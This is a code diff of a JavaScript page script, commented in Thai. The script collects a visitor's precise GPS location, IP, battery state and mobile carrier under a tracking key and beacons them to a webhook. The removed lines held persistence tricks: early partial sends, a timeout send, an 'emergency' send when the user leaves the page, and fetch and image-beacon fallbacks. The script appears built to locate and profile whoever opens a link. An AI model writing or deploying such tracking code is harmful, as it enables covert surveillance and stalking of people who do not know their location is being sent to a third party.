@@ -93,88 +93,7 @@ function getUrlParameters() {
     phoneInfo: { possibleOperator: "กำลังตรวจสอบ..." } // Placeholder for phone
   };
 
-  // --- ตรวจสอบว่ามีข้อมูล GPS จาก index.html แล้วหรือไม่ ---
-  let locationPromise;
-  if (window.globalGpsData && window.globalGpsData.status === "success") {
-    console.log("ใช้ข้อมูล GPS ที่ได้รับจาก index.html");
-    const gpsData = window.globalGpsData;
-    locationPromise = Promise.resolve({
-      lat: gpsData.lat,
-      long: gpsData.long,
-      accuracy: gpsData.accuracy
-    });
-    
-    // อัปเดตข้อมูล location ทันทีเพื่อให้ส่งเร็วขึ้น
-    dataToSend.location = `${gpsData.lat}, ${gpsData.long}`;
-    dataToSend.locationAccuracy = gpsData.accuracy;
-    
-    // ส่งข้อมูลเบื้องต้นทันทีที่มี GPS แล้ว (ก่อนรอข้อมูลอื่น)
-    const initialData = {
-      ...dataToSend,
-      requestId: requestId + "-initial",
-      partialData: true
-    };
-    
-    setTimeout(() => {
-      console.log("ส่งข้อมูลเบื้องต้นที่มี GPS แล้ว");
-      sendDataWithBeacon(initialData);
-    }, 500); // รอเล็กน้อยเพื่อให้การทำงานไม่ติดขัด
-  }
-  // กรณีที่ยังไม่มีข้อมูล GPS จาก index.html หรือยังไม่สำเร็จ
-  else {
-    // --- ดึงพิกัด GPS อีกครั้งถ้าจำเป็น ---
-    locationPromise = new Promise((resolve, reject) => {
-      if (navigator.geolocation) {
-        const geoOptions = {
-          enableHighAccuracy: true, 
-          timeout: 5000, // ลดเวลา timeout ให้น้อยลง (5 วินาที)
-          maximumAge: 0 // ต้องการข้อมูลพิกัดล่าสุดเสมอ
-        };
-        
-        console.log("กำลังดึงพิกัด GPS...");
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            console.log("ได้รับข้อมูล GPS แล้ว");
-            const result = {
-              lat: position.coords.latitude,
-              long: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            };
-            
-            // อัปเดตข้อมูล location ทันที
-            dataToSend.location = `${result.lat}, ${result.long}`;
-            dataToSend.locationAccuracy = result.accuracy;
-            
-            // ส่งข้อมูลเบื้องต้นทันทีที่มี GPS แล้ว
-            const initialData = {
-              ...dataToSend,
-              requestId: requestId + "-initial",
-              partialData: true
-            };
-            
-            setTimeout(() => {
-              console.log("ส่งข้อมูลเบื้องต้นที่มี GPS แล้ว");
-              sendDataWithBeacon(initialData);
-            }, 500);
-            
-            resolve(result);
-          },
-          (error) => {
-            console.warn(`ไม่สามารถรับพิกัด GPS: ${error.message}`);
-            dataToSend.location = `ไม่สามารถรับพิกัดได้: ${error.message}`;
-            resolve(null);
-          },
-          geoOptions
-        );
-      } else {
-        console.log("เบราว์เซอร์นี้ไม่รองรับ Geolocation");
-        dataToSend.location = "เบราว์เซอร์ไม่รองรับ Geolocation";
-        resolve(null);
-      }
-    });
-  }
-
-  // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous (ข้อมูลอื่นๆ นอกจาก GPS) ---
+  // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous ---
 
   // 1. Battery Info
   const batteryPromise = getBatteryInfo().then(batteryData => {
@@ -203,73 +122,67 @@ function getUrlParameters() {
     dataToSend.phoneInfo = { possibleOperator: "ข้อผิดพลาด" };
   });
 
-  // สร้างตัวแปรกำหนดว่าข้อมูลทั้งหมดได้ถูกส่งแล้วหรือไม่
-  let dataFullySent = false;
+  // 4. Geolocation
+  let locationPromise;
+  if (navigator.geolocation) {
+    console.log("Requesting geolocation...");
+    locationPromise = new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          console.log("Geolocation success:", position.coords);
+          resolve({
+            lat: position.coords.latitude,
+            long: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            // สร้าง Link ภายใน Google Apps Script จะดีกว่า เพื่อความยืดหยุ่น
+            // gmapLink: `https://www.google.com/maps?q=$${position.coords.latitude},${position.coords.longitude}`
+          });
+        },
+        error => {
+          console.error(`Geolocation error: ${error.message} (Code: ${error.code})`);
+          resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อเกิดข้อผิดพลาด
+        },
+        {
+          timeout: 15000, // 15 วินาที
+          enableHighAccuracy: true,
+          maximumAge: 0 // ขอข้อมูลใหม่เสมอ
+        }
+      );
+    }).then(location => {
+        dataToSend.location = location;
+    }).catch(() => {
+        // Handle potential errors within the promise chain if needed, though resolve("ไม่มีข้อมูล") covers most cases
+        dataToSend.location = "ข้อผิดพลาดในการขอตำแหน่ง";
+    });
+
+    // เพิ่ม Timeout สำหรับ Geolocation โดยรวม
+    locationPromise = Promise.race([
+        locationPromise,
+        new Promise(resolve => setTimeout(() => {
+            if (dataToSend.location === "กำลังตรวจสอบ...") { // ถ้ายังไม่ได้ผลลัพธ์
+                 console.warn("Geolocation request timed out after 15 seconds.");
+                 dataToSend.location = "ไม่มีข้อมูล (Timeout)";
+            }
+            resolve(); // Resolve race promise
+        }, 15000))
+    ]);
+
+  } else {
+    // ถ้าไม่รองรับ Geolocation
+    console.warn("Geolocation API is not supported in this browser.");
+    dataToSend.location = "ไม่รองรับ";
+    locationPromise = Promise.resolve(); // สร้าง Promise ที่ resolve ทันที
+  }
 
   // --- รอข้อมูล Asynchronous ทั้งหมด แล้วส่งข้อมูล ---
   Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise])
     .then(() => {
-      console.log("รวบรวมข้อมูลทั้งหมดเสร็จสิ้น");
-      
-      // เพิ่มข้อมูล metadata ว่าเป็นข้อมูลชุดสมบูรณ์
-      dataToSend.fullData = true;
-      
-      // ส่งข้อมูลแบบสมบูรณ์
-      console.log("กำลังส่งข้อมูลชุดสมบูรณ์...");
+      // ณ จุดนี้ ข้อมูลทั้งหมด (หรือสถานะข้อผิดพลาด) ควรจะอยู่ใน dataToSend แล้ว
+      console.log("All async data collected (or timed out/error). Final data:", JSON.stringify(dataToSend));
+
+      // ส่งข้อมูลทั้งหมดโดยใช้ sendBeacon
       sendDataWithBeacon(dataToSend);
-      dataFullySent = true;
     });
-
-  // --- เพิ่ม timeout safety เพื่อส่งข้อมูลหากรวบรวมข้อมูลไม่เสร็จ ---
-  setTimeout(() => {
-    if (!dataFullySent) {
-      console.log("หมดเวลารอข้อมูลครบถ้วน ส่งข้อมูลที่มีในขณะนี้");
-      
-      // แทนที่ข้อมูล pending ด้วยข้อความ timeout
-      if (dataToSend.ip.ip === "กำลังตรวจสอบ...") {
-        dataToSend.ip.ip = "Timeout - ไม่สามารถดึงข้อมูลได้";
-      }
-      if (dataToSend.location === "กำลังตรวจสอบ...") {
-        dataToSend.location = "Timeout - ไม่สามารถดึงพิกัดได้";
-      }
-      if (dataToSend.phoneInfo.possibleOperator === "กำลังตรวจสอบ...") {
-        dataToSend.phoneInfo.possibleOperator = "Timeout - ไม่สามารถระบุได้";
-      }
-      
-      // เพิ่มข้อมูล metadata ว่าเป็นข้อมูลที่ไม่ครบถ้วน
-      dataToSend.timeoutData = true;
-      
-      // ส่งข้อมูลที่มี ณ ขณะนี้
-      sendDataWithBeacon(dataToSend);
-      dataFullySent = true;
-    }
-  }, 4000); // timeout 4 วินาที
-
-  // --- เพิ่ม Event Listener เมื่อผู้ใช้จะออกจากหน้า ---
-  window.addEventListener('beforeunload', function(e) {
-    // ตรวจสอบว่าข้อมูลถูกส่งครบถ้วนแล้วหรือไม่
-    if (!dataFullySent) {
-      console.log("ผู้ใช้กำลังออกจากหน้า ส่งข้อมูลฉุกเฉิน");
-      
-      // แทนที่ข้อมูลที่ยังไม่ได้รับด้วยข้อความ
-      if (dataToSend.ip.ip === "กำลังตรวจสอบ...") {
-        dataToSend.ip.ip = "User Left - ไม่สามารถดึงข้อมูลได้";
-      }
-      if (dataToSend.location === "กำลังตรวจสอบ...") {
-        dataToSend.location = "User Left - ไม่สามารถดึงพิกัดได้";
-      }
-      if (dataToSend.phoneInfo.possibleOperator === "กำลังตรวจสอบ...") {
-        dataToSend.phoneInfo.possibleOperator = "User Left - ไม่สามารถระบุได้";
-      }
-      
-      // เพิ่มข้อมูล metadata ว่าเป็นข้อมูลฉุกเฉิน
-      dataToSend.emergencyData = true;
-      
-      // ส่งข้อมูลด้วย sendBeacon เพื่อให้แน่ใจว่าจะส่งแม้ผู้ใช้ออกจากหน้า
-      sendDataWithBeacon(dataToSend);
-      dataFullySent = true;
-    }
-  });
 
 })(); // End of main IIFE
 
@@ -300,60 +213,27 @@ function sendDataWithBeacon(dataToSend) {
   }
 
   try {
-    let success = false;
-    
-    // พยายามใช้ navigator.sendBeacon ก่อน (ทำงานได้แม้ผู้ใช้ออกจากหน้า)
-    if (navigator.sendBeacon) {
-      const blob = new Blob([JSON.stringify(dataToSend)], {type: 'application/json'});
-      success = navigator.sendBeacon(webhookUrl, blob);
-      
-      if (success) {
-        console.log(`ส่งข้อมูลด้วย sendBeacon สำเร็จ (RequestId: ${currentRequestId})`);
+    // แปลงข้อมูลเป็น Blob ที่มี content type ถูกต้องเพื่อให้ GAS รับได้ง่าย
+    const blob = new Blob([JSON.stringify(dataToSend)], { type: 'text/plain;charset=utf-8' });
+
+    // ส่งข้อมูลด้วย sendBeacon
+    const success = navigator.sendBeacon(webhookUrl, blob);
+
+    if (success) {
+      console.log(`sendBeacon successful for requestId: ${currentRequestId}`);
+      // บันทึกว่าส่งแล้วใน session นี้
+      try {
         sessionStorage.setItem(sentKey, 'true');
-        return true;
+        console.log(`บันทึก requestId ${currentRequestId} ลงใน sessionStorage หลัง sendBeacon`);
+      } catch (e) {
+        console.error("ไม่สามารถบันทึก requestId ลง sessionStorage:", e);
       }
-      console.log("sendBeacon ล้มเหลว ลองใช้ fetch แทน");
+    } else {
+      console.error(`sendBeacon failed for requestId: ${currentRequestId}. Browser might have queued it.`);
+      // อาจจะลอง fallback ไปใช้ fetch หรือแจ้งเตือน (แต่ sendBeacon ควรจะน่าเชื่อถือที่สุด)
     }
-    
-    // ถ้า sendBeacon ล้มเหลวหรือไม่รองรับ ให้ใช้ fetch แทน
-    if (!success) {
-      // ใช้ fetch ในรูปแบบ fire-and-forget เพื่อไม่ให้ต้องรอตอบกลับ
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(dataToSend),
-        // keepalive ช่วยให้ request ยังทำงานต่อได้แม้หน้าจะถูกปิด
-        keepalive: true
-      }).then(() => {
-        console.log(`ส่งข้อมูลด้วย fetch (keepalive) สำเร็จ (RequestId: ${currentRequestId})`);
-        try { sessionStorage.setItem(sentKey, 'true'); } catch(e) {}
-      }).catch(err => {
-        console.error(`ส่งข้อมูลด้วย fetch (keepalive) ล้มเหลว: ${err}`);
-      });
-    }
-    
-    return true;
   } catch (error) {
-    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
-    
-    // กรณีเกิดข้อผิดพลาด ลองส่งด้วย Image Beacon เป็นทางเลือกสุดท้าย
-    try {
-      const imgBeacon = new Image();
-      const params = new URLSearchParams();
-      params.append('data', JSON.stringify({
-        requestId: currentRequestId,
-        trackingKey: dataToSend.trackingKey,
-        timestamp: dataToSend.timestamp,
-        emergency: true,
-        error: "ใช้ Image Beacon เนื่องจาก method อื่นล้มเหลว"
-      }));
-      imgBeacon.src = `${webhookUrl}?${params.toString()}`;
-      console.log("ลองส่งข้อมูลด้วย Image Beacon");
-    } catch (imgError) {
-      console.error("Image Beacon ล้มเหลว:", imgError);
-    }
-    
-    return false;
+    console.error(`Error calling sendBeacon for requestId ${currentRequestId}:`, error);
   }
 }
 
